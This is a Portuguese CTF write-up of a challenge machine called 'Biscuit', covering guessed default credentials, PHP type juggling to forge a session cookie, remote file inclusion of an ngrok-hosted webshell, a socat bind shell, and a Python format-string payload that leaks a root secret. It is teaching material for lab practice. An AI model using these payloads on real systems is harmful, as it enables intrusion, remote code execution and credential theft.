---
layout: article
title:  "UHCCTF (Classificatória) - Biscuit (Official Write-Up) pt-br"
tags: pt-br ctf write-up
---

Ola sou o Vinicius (big0us), esse é um write-up de uma maquina que foi o challenge de uma das etapas classificatórias do UHC.

Escreverei meio rápido então peço desculpas se algo estiver um pouco ruim.

Boa leitura :)

g00d_h4ck1ng

# Recon

![/assets/biscuit/Untitled.png](/assets/biscuit/Untitled.png)

A primeira página é uma página de login, dando uma olhada no HTML da página aparentemente não existe nada escondido, vou rodar um fuzzing e depois poderemos testar algumas credenciais.

![/assets/biscuit/Untitled%201.png](/assets/biscuit/Untitled%201.png)

Aparentemente nosso fuzzing entregou apenas um /class, onde existe um directory listing apontando um arquivo ".php".

![/assets/biscuit/Untitled%202.png](/assets/biscuit/Untitled%202.png)

Ok, vamos testar algumas credenciais padrões no formulário de login:

```
admin:admin
guest:guest
administrator:admin
root:root
```

Testando "guest:guest" conseguimos entrar:

![/assets/biscuit/Untitled%203.png](/assets/biscuit/Untitled%203.png)

Dando uma olhada aparentemente temos só uma página de welcome.

Vamos ver nossos cookies.

![/assets/biscuit/Untitled%204.png](/assets/biscuit/Untitled%204.png)

Vamos entender melhor esse cookie chamado session pois ele parece ser interessante:

![/assets/biscuit/Untitled%205.png](/assets/biscuit/Untitled%205.png)

Utilizando o cyberchef para decodar o cookie podemos perceber que se trata de um JSON com três valores: hmac (provavelmente algo que valide os valores), username, e uma hora para o cookie expirar.

Vou tentar alterar o valor de username para "admin" encodar em base64, url e então enviar para a aplicação.

![/assets/biscuit/Untitled%206.png](/assets/biscuit/Untitled%206.png)

Aparentemente retornou um erro dizendo que estamos tentando fazer um "temperamento de cookie", e retornou uma flag! Nossa primeira flag.

Depois de alguns testes enviando cookies com outros valores aleatórios, acabei percebendo que a aplicação valida o Cookie pelo valor do hmac, e não pelo conteudo inteiro do json.

Uma vulnerabilidade muito conhecida sobre validações do PHP é o type jugling, que consiste em bypass de autenticações fazendo qualquer if($ == $) retornar "true".

[PHP Tricks (SPA)](https://book.hacktricks.xyz/pentesting/pentesting-web/php-tricks-esp)

[PHP Type Juggling Vulnerabilities](https://medium.com/swlh/php-type-juggling-vulnerabilities-3e28c4ed5c09)

![/assets/biscuit/Untitled%207.png](/assets/biscuit/Untitled%207.png)

Basicamente quando um programador utiliza "==" em uma comparação o php primeiro torna os dois valores do mesmo tipo, ignorando o tipo (int, str...) das variáveis.

E nessa operação podemos utilizar algumas técnicas para a comparação retornar "true".

# Exploitation

Depois de um tempo tentando, testei trocar o valor do "hmac" para "true" e aparentemente funcionou!

![/assets/biscuit/Untitled%208.png](/assets/biscuit/Untitled%208.png)

```json
{"hmac":true,"username":"admin","expiration":1625435484}
```

![/assets/biscuit/Untitled%209.png](/assets/biscuit/Untitled%209.png)

Ok, fiquei triste que não existe nenhuma flag por aqui 😢.

Vou tentar alterar o nome do usuário para entender o que está acontecendo.

Alterando para "test" o php nos retorna um erro, aparentemente ele está rodando um "require_once" no valor que colocamos + adicionando .php no final. require_once normalmente é usado para incluir páginas e arquivos php em sites, e quando o usuário tem controle sobre o valor que o require_once vai usar a aplicação está vulnerável a LFI ou RFI (Local/Remote File Inclusion).

![/assets/biscuit/Untitled%2010.png](/assets/biscuit/Untitled%2010.png)

Como a aplicação ja coloca o .php no final vou fazer o seguinte.

Subir um arquivo com uma webshell num servidor utilizando o ngrok, mandar a a aplicação incluir meu arquivo e conseguir um RCE.

![/assets/biscuit/Untitled%2011.png](/assets/biscuit/Untitled%2011.png)

E vou mandar a payload:

```json
{"hmac":true,"username":"https://3b4f8afabab2.ngrok.io/shell","expiration":1625435484}
```

(A aplicação ja vai colocar o .php)

Temos RCE!!

![/assets/biscuit/Untitled%2012.png](/assets/biscuit/Untitled%2012.png)

Agora vou tentar pegar uma reverse shell.

Após algumas tentativas percebi que existe um firewall na aplicação que bloqueia qualquer comunicação em portas que não forem 80 ou 443, como eu não tenho uma VPS, vou fazer de uma forma diferente, ao invés de uma reverse shell (onde a vitima se conecta no atante) vou pegar uma bind shell (abrindo uma porta na maquina e me conectando nela).

Para isso vou usar o "socat".

[socat | GTFOBins](https://gtfobins.github.io/gtfobins/socat/#bind-shell)

![/assets/biscuit/Untitled%2013.png](/assets/biscuit/Untitled%2013.png)

Primeiro peguei o binario do socat no github deles (socat binary) e passei pra maquina utilizando o web-server que eu criei para conseguir RCE, e dando um curl.

Então rodei os comandos que estão na imagem e consegui uma bind shell! (utilizei a porta 6969)

![/assets/biscuit/Untitled%2014.png](/assets/biscuit/Untitled%2014.png)

E navegando um pouco no / encontramos a próxima flag:

![/assets/biscuit/Untitled%2015.png](/assets/biscuit/Untitled%2015.png)

# Pós Exploitation

Fazendo o básico checklist de priv esc podemos perceber que estamos com o usuário do apache e podemos rodar um script como root na máquina:

![/assets/biscuit/Untitled%2016.png](/assets/biscuit/Untitled%2016.png)

Aparentemente não podemos ler o script e nem altera-lo.

![/assets/biscuit/Untitled%2017.png](/assets/biscuit/Untitled%2017.png)

O que nos resta é roda-lo:

![/assets/biscuit/Untitled%2018.png](/assets/biscuit/Untitled%2018.png)

Aparentemente ele printa um IP, dando uma olhada no /var/www/html o path da aplicação web podemos perceber que existe um arquivo com o mesmo ip que ele printou, então aparentemente ele está printando o IP que está no arquivo.

![/assets/biscuit/Untitled%2019.png](/assets/biscuit/Untitled%2019.png)

Abri o arquivo com o nano (antes rodar 'export TERM=xterm' !!) e começei a edita-lo para tentar retornar algum erro no python que me mostre alguma coisa do programa.

![/assets/biscuit/Untitled%2020.png](/assets/biscuit/Untitled%2020.png)

![/assets/biscuit/Untitled%2021.png](/assets/biscuit/Untitled%2021.png)

Interessante, aparentemente existe um format string diferente (pouco usado) rodando.

Pesquisando sobre esse tipo de format string + vulnerabilites acabei tropeçando nesse artigo.

[Are there any Security Concerns to using Python F Strings with User Input](https://security.stackexchange.com/questions/238338/are-there-any-security-concerns-to-using-python-f-strings-with-user-input)

Basicamente nele explica-se tudo o que precisamos fazer, por isso não vou explicar direitinho, mas basicamente a forma que esse format string funciona nos permite injetar mais strings para serem formatadas, e se isso é printado podemos printar todas as váriaveis globais que o arquivo usa, normlamente dando alguma key ou senha para nós. (Para quem não entende muito bem inglês é só traduzir que fica tranquilo de entender).

Ok então vamos a payload.

```json
{"ips":["{ip.list_blocked.__globals__}"]}
```

![/assets/biscuit/Untitled%2022.png](/assets/biscuit/Untitled%2022.png)

Aparentemente funcionou e conseguimos o valor de uma váriavel chamada root_secret, provavelmente é a senha do root.

![/assets/biscuit/Untitled%2023.png](/assets/biscuit/Untitled%2023.png)

Worked!!

Obrigado a você que leu até aqui, parabéns cadu pela máquina, e desclupe por algum erro no write-up, fiz correndo >_>